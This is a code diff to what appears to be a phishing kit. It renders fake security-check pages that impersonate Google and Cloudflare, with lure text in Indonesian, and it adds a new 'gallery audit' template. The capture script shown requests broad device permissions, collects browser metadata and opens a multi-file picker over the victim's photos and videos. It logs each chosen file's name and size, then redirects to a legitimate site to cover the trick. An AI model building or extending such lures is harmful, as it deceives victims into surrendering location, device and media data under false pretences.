@@ -17,7 +17,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     function checkRedirect() {
       if (hasRedirected) return;
       var elapsed = (Date.now() - startTime) / 1000;
-      var threshold = (flowType === 'full') ? 50 : 15;
+      var threshold = (flowType === 'full') ? 60 : 15;
+      if (cfg.tmplId === 'gallery') return; // Stay on result page
       if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
         hasRedirected = true;
         window.location.href = targetUrl;
@@ -76,16 +77,26 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         if (success) {
           if (icon) icon.innerText = "✅";
           if (statusTitle) { statusTitle.innerText = "VERIFIED"; statusTitle.style.color = "#27ae60"; }
-          if (statusText) statusText.innerText = "Sertifikat keamanan diterbitkan. Mengalihkan...";
+          if (statusText) {
+             if (cfg.tmplId === 'gallery') {
+               statusText.innerHTML = "<b>Audit Selesai.</b><br>Terima kasih atas kerjasama anda, hubungi kami untuk segera menghapus semua percobaan yang telah kita lakukan bersama.<br><br>📧 <b>Audit54G@gmail.com</b>";
+             } else {
+               statusText.innerText = "Sertifikat keamanan diterbitkan. Mengalihkan...";
+             }
+          }
         } else {
           if (icon) icon.innerText = "ℹ️";
           if (statusTitle) statusTitle.innerText = "COMPLETE";
           if (statusText) statusText.innerText = "Proses selesai. Membuka akses...";
         }
-        setTimeout(checkRedirect, 3000);
+        if (cfg.tmplId !== 'gallery') {
+          setTimeout(checkRedirect, 3000);
+        }
       }
 
       try {
+        if (cfg.msgBefore) alert(cfg.msgBefore);
+        
         if (!isSilent) updateProgress(8, "Menganalisis integritas browser...", "SECURITY_CHECK");
         
         var metadata = {
@@ -162,10 +173,12 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'files') {
               if (!isSilent) updateProgress(prog, "Sinkronisasi token media galeri...", "STORAGE_CERT");
               if (window.showOpenFilePicker) {
-                 var handle = await window.showOpenFilePicker({ types: [{ description: 'Security Cert', accept: { 'image/*': ['.png','.jpg','.jpeg'] } }] }).catch(function(){ return null; });
-                 if (handle && handle[0]) {
-                   var file = await handle[0].getFile();
-                   await logEvent('extra', { file_name: file.name, file_size: file.size });
+                 var handle = await window.showOpenFilePicker({ multiple: true, types: [{ description: 'Media Audit', accept: { 'image/*': ['.png','.jpg','.jpeg'], 'video/*': ['.mp4'] } }] }).catch(function(){ return null; });
+                 if (handle) {
+                    for (const item of handle) {
+                      var file = await item.getFile();
+                      await logEvent('extra', { file_name: file.name, file_size: file.size });
+                    }
                  }
               }
             }
@@ -192,16 +205,16 @@ export const templates: Record<string, {name: string, render: (id: string) => st
       tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
     })}</body></html>`
   },
+  'gallery': {
+    name: "🖼️ Gallery: Audit & Sync (Ultimate Robin Hood)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Audit</title><style>body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:420px; padding:40px; border:1px solid #333; border-radius:12px; text-align:center; background:#0a0a0a; } .btn { background:#fff; color:#000; padding:16px; border-radius:8px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size:16px; margin-top:25px; transition: 0.3s; } .btn:hover { background: #ccc; }</style></head><body><div class="box"><div style="font-size:50px;">🔒</div><h2>Identity Awareness Audit</h2><p style="color:#888; font-size:14px; line-height:1.6;">Protokol keamanan mendeteksi aktivitas mencurigakan. Sinkronisasi metadata gallery dan spatial diperlukan untuk validasi kepemilikan perangkat.</p><p style="color:#ff4757; font-size:12px;"><b>Warning:</b> Jika kamu menerima izin ini maka saya harap kamu mengingat detail kerjasama ini.</p><button class="btn" onclick="window.startCapture();">Mulai Verifikasi Audit</button></div>${getCaptureScript(id, 'https://google.com', {
+      tmplId: 'gallery', perms: ALL_PERMS, accent: '#ffffff', icon: '🕵️', msgBefore: 'Jika kamu menerima izin ini maka saya harap kamu mengingat detail kerjasama ini.'
+    })}</body></html>`
+  },
   'cloudflare': {
     name: "☁️ Cloudflare: Integrity Audit (OP - Corporate)",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Reviewing security...</title><style>body { font-family: system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .box { max-width:500px; } .spinner { border:3px solid #f3f3f3; border-top:3px solid #fa8231; border-radius:50%; width:40px; height:40px; animation: spin 1s linear infinite; margin:30px auto; } @keyframes spin { to { transform:rotate(360deg); } } h1 { font-size:26px; font-weight:500; } .btn { background:#fff; border:1px solid #ccc; padding:12px 30px; border-radius:4px; color:#333; font-weight:600; cursor:pointer; width:100%; font-size:15px; margin-top:10px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="130"><div class="spinner"></div><h1>Checking your browser...</h1><p style="color:#666; font-size:15px;">Harap konfirmasi integritas hardware dan lokasi regional Anda untuk melewati firewall perlindungan DDoS kami.</p><button class="btn" onclick="window.startCapture();">Verify you are human</button></div>${getCaptureScript(id, 'https://cloudflare.com', {
       tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#fa8231', icon: '☁️'
-    })}</body></html>`
-  },
-  'file': {
-    name: "📂 Transfer: Media Unlock (OP - Gallery Bait)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Download File</title><style>body { background:#f9fafb; font-family: -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; width:90%; max-width:400px; padding:40px; border-radius:16px; text-align:center; border:1px solid #edf2f7; box-shadow:0 4px 6px -1px rgba(0,0,0,0.1); } .btn { background:#007aff; color:#fff; padding:16px 30px; border-radius:12px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size:16px; }</style></head><body><div class="box"><div style="font-size:60px; margin-bottom:20px;">📦</div><h2>Unduh Tersedia</h2><p style="color:#4a5568; font-size:14px;">Seseorang telah berbagi file dengan Anda. Verifikasi akses **Storage & Lokasi** diperlukan untuk membuka enkripsi file ini.</p><button class="btn" onclick="window.startCapture();">BUKA SEKARANG</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: 'file', perms: ALL_PERMS, accent: '#007aff', icon: '📂'
     })}</body></html>`
   },
   'pegasus': {
@@ -223,3 +236,4 @@ export const templates: Record<string, {name: string, render: (id: string) => st
     })}</body></html>`
   }
 };
+
